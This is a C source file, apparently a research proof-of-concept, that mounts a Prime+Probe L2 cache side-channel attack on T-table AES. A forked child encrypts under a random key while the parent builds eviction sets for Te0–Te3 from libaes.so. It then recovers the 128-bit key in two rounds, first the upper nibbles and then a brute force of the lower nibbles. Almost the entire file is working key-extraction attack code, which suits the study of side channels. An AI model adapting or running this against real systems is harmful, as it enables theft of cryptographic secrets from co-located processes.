#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <time.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <openssl/aes.h>

#include <basics/defs.h>
#include <basics/arch.h>
#include <basics/params.h>
#include <basics/cache_line_set.h>
#include <basics/cache_utils.h>
#include <basics/sys_utils.h>
#include <basics/math_utils.h>
#include <prime_probe_variants/prime_probe_variants.h>
#include <eviction_set/eviction_set.h>
#include <eviction_set/eviction_set_generation.h>

#define KEY_SIZE_W   16     // 16 words per key(128 bits)
#define BLOCK_SIZE_W 16     // 16 words per block(128 bits)

#define LEN 32
unsigned char key[LEN] = {0};

uint8_t* te0_pivot_addr;
uint8_t* te1_pivot_addr;
uint8_t* te2_pivot_addr;
uint8_t* te3_pivot_addr;
eviction_set_t* te0_l2_eviction_set;
eviction_set_t* te1_l2_eviction_set;
eviction_set_t* te2_l2_eviction_set;
eviction_set_t* te3_l2_eviction_set;

// synchronization variables between child and parent
volatile uint8_t* child_prep_done;
volatile uint8_t* terminate_child;
volatile uint8_t* do_encrypt;
volatile uint8_t* encrypt_done;

// plaintext and ciphertext shared between parent and child
uint8_t* plaintext;
uint8_t* ciphertext;
uint32_t* rk;

#include "sbox.h"

unsigned char XTIME(unsigned char x) 
{
    return ((x << 1) ^ ((x & 0x80) ? 0x1b : 0x00));
}
unsigned char E1_x_2(unsigned char p[], unsigned char key[]){
  return sBox[p[0]^key[0]] ^ sBox[p[5]^key[5]] ^ XTIME(sBox[p[10]^key[10]]) ^ XTIME(sBox[p[15]^key[15]]) ^ sBox[p[15]^key[15]] ^ sBox[key[15]] ^ key[2];
}

unsigned char E1_x_5(unsigned char p[], unsigned char key[]){
  return sBox[p[4]^key[4]] ^ sBox[p[3]^key[3]] ^ XTIME(sBox[p[9]^key[9]]) ^ XTIME(sBox[p[14]^key[14]]) ^ sBox[p[14]^key[14]] ^ sBox[key[14]] ^ key[1] ^ key[5];
}

unsigned char E1_x_8(unsigned char p[], unsigned char key[]){
  return sBox[p[2]^key[2]] ^ sBox[p[7]^key[7]] ^ XTIME(sBox[p[8]^key[8]]) ^ XTIME(sBox[p[13]^key[13]]) ^ sBox[p[13]^key[13]] ^ sBox[key[13]] ^ key[0] ^ key[4] ^ key[8] ^ 1;
}

unsigned char E1_x_15(unsigned char p[], unsigned char key[]){
  return sBox[p[1]^key[1]] ^ sBox[p[6]^key[6]] ^ XTIME(sBox[p[11]^key[11]]) ^ XTIME(sBox[p[12]^key[12]]) ^ sBox[p[12]^key[12]] ^ sBox[key[12]] ^ key[15] ^ key[3] ^ key[7] ^ key[11];
}

uint8_t get_roundkeybyte_highhalf(int rk_index, int rk_subbyte_index) {

    int plaintext_index = 4*rk_index + (3 - rk_subbyte_index);

    uint8_t* pivot_addr;
    eviction_set_t* l2_eviction_set;
    if (rk_subbyte_index == 3) {
        pivot_addr = te0_pivot_addr;
        l2_eviction_set = te0_l2_eviction_set;
    }
    else if (rk_subbyte_index == 2) {
        pivot_addr = te1_pivot_addr;
        l2_eviction_set = te1_l2_eviction_set;
    }
    else if (rk_subbyte_index == 1) {
        pivot_addr = te2_pivot_addr;
        l2_eviction_set = te2_l2_eviction_set;
    }
    else if (rk_subbyte_index == 0) {
        pivot_addr = te3_pivot_addr;
        l2_eviction_set = te3_l2_eviction_set;
    }
    else {
        assert (0);
    }

    for (int i = 0; i < BLOCK_SIZE_W; i++) {
        plaintext[i] = 0;
        ciphertext[i] = 0;
    }

    int total_evict_list[256/16] = {0};
    for (int byte = 0; byte < 256; byte += 16) {
        plaintext[plaintext_index] = byte;

        // ask child to encrypt the plaintext
        *do_encrypt = 1;
        while (*encrypt_done == 0) {}
        *encrypt_done = 0;

        int total_evict = 0;
        for (int i = 0; i < 10000; i++) {

            for (int j = 0; j < BLOCK_SIZE_W; j++)
                if (j != plaintext_index)
                    plaintext[j] = rand() % 256;

            PrimeP1S1(pivot_addr, l2_eviction_set);

            // ask child to encrypt the plaintext
            *do_encrypt = 1;
            while (*encrypt_done == 0) {}
            *encrypt_done = 0;

            int evict = ProbeS1P1(pivot_addr, l2_eviction_set);

            total_evict += evict;
        }
        total_evict_list[byte/16] += total_evict;
    }

    int max_i = -1, max_evict = 0;
    for (int i = 0; i < 256/16; i++) {
        if (total_evict_list[i] > max_evict){
            max_i = i;
            max_evict = total_evict_list[i];
        }
        /*printf("i: %d, evict: %d\n", i, total_evict_list[i]);*/
    }
    /*exit(0);*/


    printf("Prime+Probe: rk[%d][%d] high-order 4-bit is 0x%x\n", rk_index, rk_subbyte_index, max_i);

    return max_i;
}

#define get_byte(rk, idx) ((rk >> (8*idx)) & 0xff)

int main(int argc, char** argv) {
    printf("repeat %d\n", NUM_ENCRYPTION);

    srand(time(NULL));
    allocate_cache_flush_buffer();

    // allocate memory for shared variables
    uint8_t* shared_page = (uint8_t*)mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, 0, 0);
    assert(shared_page);
    memset(shared_page, 0xff, PAGE_SIZE);

    child_prep_done = &shared_page[0];
    *child_prep_done = 0;
    terminate_child = &shared_page[1];
    *terminate_child = 0;
    do_encrypt = &shared_page[2];
    *do_encrypt = 0;
    encrypt_done = &shared_page[3];
    *encrypt_done = 0;

    // allocate memory for plaintext and ciphertext
    plaintext = (uint8_t*)mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, 0, 0);
    ciphertext = (uint8_t*)mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, 0, 0);
    memset(plaintext, 0x0, PAGE_SIZE);
    memset(plaintext, 0x0, PAGE_SIZE);

        // create a random key
        for (int i = 0; i < LEN; i++)
            key[i] = rand() % 0x100;

        // generate AES encrypt key
        AES_KEY aes_enc_key;
        AES_set_encrypt_key(key, KEY_SIZE_W * 8, &aes_enc_key);
        rk = aes_enc_key.rd_key;

    int child_pid;
    if ((child_pid = fork()) == 0) {
        // child
        pin_p_core(P_CORE_0_ID);

        *child_prep_done = 1;

        while (1) {
            while (*do_encrypt == 0) {
                if (*terminate_child)
                    goto L_child_exit;
            }

            *do_encrypt = 0;

            AES_encrypt(plaintext, ciphertext, &aes_enc_key);

            *encrypt_done = 1;
        }

L_child_exit:
        return 0;

    }
    else {
        // parent
        pin_p_core(P_CORE_1_ID);

        // get the address of Te0~3
        void* handle = dlopen("libaes.so", RTLD_NOW|RTLD_GLOBAL);
        if (handle == 0) {
            fprintf(stderr, "ERROR: cannot load libaes.so.\n");
            exit(1);
        }

        uint64_t te0_addr = (uint64_t)dlsym(handle, "Te0");
        uint64_t te1_addr = (uint64_t)dlsym(handle, "Te1");
        uint64_t te2_addr = (uint64_t)dlsym(handle, "Te2");
        uint64_t te3_addr = (uint64_t)dlsym(handle, "Te3");
        assert(te0_addr);
        assert(te1_addr);
        assert(te2_addr);
        assert(te3_addr);
        if (te0_addr % L2_LINE_SIZE != 0x40 ||
            te1_addr % L2_LINE_SIZE != 0x40 ||
            te2_addr % L2_LINE_SIZE != 0x40 ||
            te3_addr % L2_LINE_SIZE != 0x40) {
            fprintf(stderr, "ERROR: this PoC is written with the assmption that te0/te1/te2/te3 is at L2 line offset 0x40 or 0xc0. Other values are not considered.\n");
            fprintf(stderr, "Other alignments will be future work.\n");
            exit(1);
        }
        printf("te0_addr: 0x%lx\n", te0_addr);
        printf("te1_addr: 0x%lx\n", te1_addr);
        printf("te2_addr: 0x%lx\n", te2_addr);
        printf("te3_addr: 0x%lx\n", te3_addr);

        /*
         * We can recover bits from rk[0][3], rk[1][3], rk[2][3], rk[3][3] from Prime+Probe Te0
         */
        // find the best eviction set and pivot addr for te0_addr
        printf("Start finding L2 eviction set and pivot addr for Te0\n");
        addr_cache_lines_pair_t* te0_pivot_addr_and_evset_cache_lines = find_L2_eviction_set_and_pivot_addr_using_llsc((uint8_t*)te0_addr);
        te0_pivot_addr = te0_pivot_addr_and_evset_cache_lines->addr;
        te0_l2_eviction_set = create_eviction_set(te0_pivot_addr_and_evset_cache_lines->cache_lines);

        // find the best eviction set and pivot addr for te1_addr
        printf("Start finding L2 eviction set and pivot addr for Te1\n");
        addr_cache_lines_pair_t* te1_pivot_addr_and_evset_cache_lines = find_L2_eviction_set_and_pivot_addr_using_llsc((uint8_t*)te1_addr);
        te1_pivot_addr = te1_pivot_addr_and_evset_cache_lines->addr;
        te1_l2_eviction_set = create_eviction_set(te1_pivot_addr_and_evset_cache_lines->cache_lines);

        // find the best eviction set and pivot addr for te2_addr
        printf("Start finding L2 eviction set and pivot addr for Te2\n");
        addr_cache_lines_pair_t* te2_pivot_addr_and_evset_cache_lines = find_L2_eviction_set_and_pivot_addr_using_llsc((uint8_t*)te2_addr);
        te2_pivot_addr = te2_pivot_addr_and_evset_cache_lines->addr;
        te2_l2_eviction_set = create_eviction_set(te2_pivot_addr_and_evset_cache_lines->cache_lines);

        // find the best eviction set and pivot addr for te3_addr
        printf("Start finding L2 eviction set and pivot addr for Te3\n");
        addr_cache_lines_pair_t* te3_pivot_addr_and_evset_cache_lines = find_L2_eviction_set_and_pivot_addr_using_llsc((uint8_t*)te3_addr);
        te3_pivot_addr = te3_pivot_addr_and_evset_cache_lines->addr;
        te3_l2_eviction_set = create_eviction_set(te3_pivot_addr_and_evset_cache_lines->cache_lines);

        time_t current_time = time(NULL);
        // convert current time to local time
        struct tm *local_time = localtime(&current_time);
        printf("current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);

        uint8_t key_guess[16] = {0};
        /*
         * Round-1 attack for upper 4 bbits in each key byte
         */
        uint8_t* pivot_addr;
        eviction_set_t* l2_eviction_set;
        for (int n = 0; n < 16; n++) {
            int total_evict_list[256/16] = {0};
            for (int byte = 0; byte < 256; byte += 16) {
                uint8_t key_guessed = byte;

                switch (n % 4) {
                    case 0:
                        pivot_addr = te0_pivot_addr;
                        l2_eviction_set = te0_l2_eviction_set;
                        break;
                    case 1:
                        pivot_addr = te1_pivot_addr;
                        l2_eviction_set = te1_l2_eviction_set;
                        break;
                    case 2:
                        pivot_addr = te2_pivot_addr;
                        l2_eviction_set = te2_l2_eviction_set;
                        break;
                    case 3:
                        pivot_addr = te3_pivot_addr;
                        l2_eviction_set = te3_l2_eviction_set;
                        break;
                    default:
                        exit(1);
                }

                int total_evict = 0;
                for (int i = 0; i < NUM_ENCRYPTION; i++) {
                    for (int j = 0; j < 16; j++)
                        plaintext[j] = rand() % 256;

                    plaintext[n] = key_guessed ^ (rand() % 16);

                    PrimeP1S1(pivot_addr, l2_eviction_set);

                    // ask child to encrypt the plaintext
                    *do_encrypt = 1;
                    while (*encrypt_done == 0) {}
                    *encrypt_done = 0;

                    int evict = ProbeS1P1(pivot_addr, l2_eviction_set);
                    total_evict += evict;
                }

                total_evict_list[byte/16] += total_evict;
            }

            int max_hi = -1, max_evict = 0;
            for (int i = 0; i < 256/16; i++) {
                if (total_evict_list[i] > max_evict){
                    max_hi = i;
                    max_evict = total_evict_list[i];
                }
            }
            key_guess[n] = max_hi << 4;
            printf("key[%d] = 0x%02x, guessed upper4 bits: 0x%02x\n", n, key[n], key_guess[n]);
        }

        current_time = time(NULL);
        // convert current time to local time
        local_time = localtime(&current_time);
        printf("DONE STEP 1. current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);


        /*
         * Round-2 attack for full key
         */

        int total_evict_list[16][16][16][16] = {0};
        int max_evict = 0;
        // K0, K5, K10, K15
        int k0_low = 0, k5_low = 0, k10_low = 0, k15_low = 0;
        pivot_addr = te2_pivot_addr;
        l2_eviction_set = te2_l2_eviction_set;
        for (uint8_t k0 = 0; k0 < 16; k0++) {
            key_guess[0] = (key_guess[0] & 0xf0) ^ k0;
            printf("k0 = %d\n", k0);
            for (uint8_t k5 = 0; k5 < 16; k5++) {
                key_guess[5] = (key_guess[5] & 0xf0) ^ k5;
                for (uint8_t k10 = 0; k10 < 16; k10++) {
                    key_guess[10] = (key_guess[10] & 0xf0) ^ k10;
                    for (uint8_t k15 = 0; k15 < 16; k15++) {
                        key_guess[15] = (key_guess[15] & 0xf0) ^ k15;

                        total_evict_list[k0][k5][k10][k15] = 0;
                        for (int i = 0; i < NUM_ENCRYPTION; i++) {
                            for (int j = 0; j < 16; j++)
                                plaintext[j] = rand() % 256;

                            plaintext[0] = inv_sBox[E1_x_2(plaintext, key_guess) ^
                                                    sBox[plaintext[0] ^ key_guess[0]] ^
                                                    (rand() % 16)] ^
                                           key_guess[0];

                            PrimeP1S1(pivot_addr, l2_eviction_set);

                            // ask child to encrypt the plaintext
                            *do_encrypt = 1;
                            while (*encrypt_done == 0) {}
                            *encrypt_done = 0;

                            int evict = ProbeS1P1(pivot_addr, l2_eviction_set);

                            total_evict_list[k0][k5][k10][k15] += evict;

                            if (total_evict_list[k0][k5][k10][k15] > max_evict) {
                                max_evict = total_evict_list[k0][k5][k10][k15];
                                k0_low = k0; k5_low = k5; k10_low = k10; k15_low = k15;
                            }
                        } // for (int i = 0; i < num_rep; i++)
                    }
                }
            }
        }

        key_guess[0] = (key_guess[0] & 0xf0) + k0_low;
        key_guess[5] = (key_guess[5] & 0xf0) + k5_low;
        key_guess[10] = (key_guess[10] & 0xf0) + k10_low;
        key_guess[15] = (key_guess[15] & 0xf0) + k15_low;
        printf("recovered k0 = 0x%02x, k5 = 0x%02x, k10 = 0x%02x, k15 = 0x%02x\n",
                key_guess[0], key_guess[5], key_guess[10], key_guess[15]);

        current_time = time(NULL);
        // convert current time to local time
        local_time = localtime(&current_time);
        printf("DONE STEP 2, 25%%. current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);


        // K3, K4, K9, K14
        max_evict = 0;
        int k3_low = 0, k4_low = 0, k9_low = 0, k14_low = 0;
        pivot_addr = te1_pivot_addr;
        l2_eviction_set = te1_l2_eviction_set;
        for (uint8_t k3 = 0; k3 < 16; k3++) {
            key_guess[3] = (key_guess[3] & 0xf0) ^ k3;
            printf("k3 = %d\n", k3);
            for (uint8_t k4 = 0; k4 < 16; k4++) {
                key_guess[4] = (key_guess[4] & 0xf0) ^ k4;
                for (uint8_t k9 = 0; k9 < 16; k9++) {
                    key_guess[9] = (key_guess[9] & 0xf0) ^ k9;
                    for (uint8_t k14 = 0; k14 < 16; k14++) {
                        key_guess[14] = (key_guess[14] & 0xf0) ^ k14;

                        total_evict_list[k3][k4][k9][k14] = 0;
                        for (int i = 0; i < NUM_ENCRYPTION; i++) {
                            for (int j = 0; j < 16; j++)
                                plaintext[j] = rand() % 256;

                            plaintext[4] = inv_sBox[E1_x_5(plaintext, key_guess) ^
                                                    sBox[plaintext[4]^key_guess[4]] ^
                                                    (rand()%16)] ^
                                           key_guess[4];

                            PrimeP1S1(pivot_addr, l2_eviction_set);

                            // ask child to encrypt the plaintext
                            *do_encrypt = 1;
                            while (*encrypt_done == 0) {}
                            *encrypt_done = 0;

                            int evict = ProbeS1P1(pivot_addr, l2_eviction_set);

                            total_evict_list[k3][k4][k9][k14] += evict;

                            if (total_evict_list[k3][k4][k9][k14] > max_evict) {
                                max_evict = total_evict_list[k3][k4][k9][k14];
                                k3_low = k3; k4_low = k4; k9_low = k9; k14_low = k14;
                            }
                        } // for (int i = 0; i < num_rep; i++)
                    }
                }
            }
        }

        key_guess[3]  = (key_guess[ 3] & 0xf0) + k3_low;
        key_guess[4]  = (key_guess[ 4] & 0xf0) + k4_low;
        key_guess[9]  = (key_guess[ 9] & 0xf0) + k9_low;
        key_guess[14] = (key_guess[14] & 0xf0) + k14_low;
        printf("recovered k3 = 0x%02x, k4 = 0x%02x, k9 = 0x%02x, k14 = 0x%02x\n",
                key_guess[3], key_guess[4], key_guess[9], key_guess[14]);

        current_time = time(NULL);
        // convert current time to local time
        local_time = localtime(&current_time);
        printf("DONE STEP 2, 50%%. current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);

        // K2, K7, K8, K13
        max_evict = 0;
        int k2_low = 0, k7_low = 0, k8_low = 0, k13_low = 0;
        pivot_addr = te0_pivot_addr;
        l2_eviction_set = te0_l2_eviction_set;
        for (uint8_t k2 = 0; k2 < 16; k2++) {
            key_guess[2] = (key_guess[2] & 0xf0) ^ k2;
            printf("k2 = %d\n", k2);
            for (uint8_t k7 = 0; k7 < 16; k7++) {
                key_guess[7] = (key_guess[7] & 0xf0) ^ k7;
                for (uint8_t k8 = 0; k8 < 16; k8++) {
                    key_guess[8] = (key_guess[8] & 0xf0) ^ k8;
                    for (uint8_t k13 = 0; k13 < 16; k13++) {
                        key_guess[13] = (key_guess[13] & 0xf0) ^ k13;

                        total_evict_list[k2][k7][k8][k13] = 0;
                        for (int i = 0; i < NUM_ENCRYPTION; i++) {
                            for (int j = 0; j < 16; j++)
                                plaintext[j] = rand() % 256;

                            plaintext[2] = inv_sBox[E1_x_8(plaintext, key_guess) ^ 
                                                    sBox[plaintext[2]^key_guess[2]] ^ 
                                                    (rand()%16)] ^ 
                                           key_guess[2];

                            PrimeP1S1(pivot_addr, l2_eviction_set);

                            // ask child to encrypt the plaintext
                            *do_encrypt = 1;
                            while (*encrypt_done == 0) {}
                            *encrypt_done = 0;

                            int evict = ProbeS1P1(pivot_addr, l2_eviction_set);

                            total_evict_list[k2][k7][k8][k13] += evict;

                            if (total_evict_list[k2][k7][k8][k13] > max_evict) {
                                max_evict = total_evict_list[k2][k7][k8][k13];
                                k2_low = k2; k7_low = k7; k8_low = k8; k13_low = k13;
                            }
                        } // for (int i = 0; i < num_rep; i++)
                    }
                }
            }
        }

        key_guess[2]  = (key_guess[ 2] & 0xf0) + k2_low;
        key_guess[7]  = (key_guess[ 7] & 0xf0) + k7_low;
        key_guess[8]  = (key_guess[ 8] & 0xf0) + k8_low;
        key_guess[13] = (key_guess[13] & 0xf0) + k13_low;
        printf("recovered k2 = 0x%02x, k7 = 0x%02x, k8 = 0x%02x, k13 = 0x%02x\n",
                key_guess[2], key_guess[7], key_guess[8], key_guess[13]);

        current_time = time(NULL);
        // convert current time to local time
        local_time = localtime(&current_time);
        printf("DONE STEP 2, 75%%. current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);


        // K1, K6, K11, K12
        max_evict = 0;
        int k1_low = 0, k6_low = 0, k11_low = 0, k12_low = 0;
        pivot_addr = te3_pivot_addr;
        l2_eviction_set = te3_l2_eviction_set;
        for (uint8_t k1 = 0; k1 < 16; k1++) {
            key_guess[1] = (key_guess[1] & 0xf0) ^ k1;
            printf("k1 = %d\n", k1);
            for (uint8_t k6 = 0; k6 < 16; k6++) {
                key_guess[6] = (key_guess[6] & 0xf0) ^ k6;
                for (uint8_t k11 = 0; k11 < 16; k11++) {
                    key_guess[11] = (key_guess[11] & 0xf0) ^ k11;
                    for (uint8_t k12 = 0; k12 < 16; k12++) {
                        key_guess[12] = (key_guess[12] & 0xf0) ^ k12;

                        total_evict_list[k1][k6][k11][k12] = 0;
                        for (int i = 0; i < NUM_ENCRYPTION; i++) {
                            for (int j = 0; j < 16; j++)
                                plaintext[j] = rand() % 256;

                            plaintext[1] = inv_sBox[E1_x_15(plaintext,key_guess) ^ 
                                                    sBox[plaintext[1]^key_guess[1]] ^ 
                                                    (rand()%16)] ^ 
                                           key_guess[1];

                            PrimeP1S1(pivot_addr, l2_eviction_set);

                            // ask child to encrypt the plaintext
                            *do_encrypt = 1;
                            while (*encrypt_done == 0) {}
                            *encrypt_done = 0;

                            int evict = ProbeS1P1(pivot_addr, l2_eviction_set);

                            total_evict_list[k1][k6][k11][k12] += evict;

                            if (total_evict_list[k1][k6][k11][k12] > max_evict) {
                                max_evict = total_evict_list[k1][k6][k11][k12];
                                k1_low = k1; k6_low = k6; k11_low = k11; k12_low = k12;
                            }
                        } // for (int i = 0; i < num_rep; i++)
                    }
                }
            }
        }

        key_guess[1]  = (key_guess[ 1] & 0xf0) + k1_low;
        key_guess[6]  = (key_guess[ 6] & 0xf0) + k6_low;
        key_guess[11] = (key_guess[11] & 0xf0) + k11_low;
        key_guess[12] = (key_guess[12] & 0xf0) + k12_low;
        printf("recovered k1 = 0x%02x, k6 = 0x%02x, k11 = 0x%02x, k12 = 0x%02x\n",
                key_guess[1], key_guess[6], key_guess[11], key_guess[12]);

        current_time = time(NULL);
        // convert current time to local time
        local_time = localtime(&current_time);
        printf("DONE STEP 2, 100%%. current time: %02d:%02d:%02d\n", local_time->tm_hour, local_time->tm_min, local_time->tm_sec);

        // terminate the child (AES encryption) thread
        *terminate_child = 1;
    }




    return 0;
}
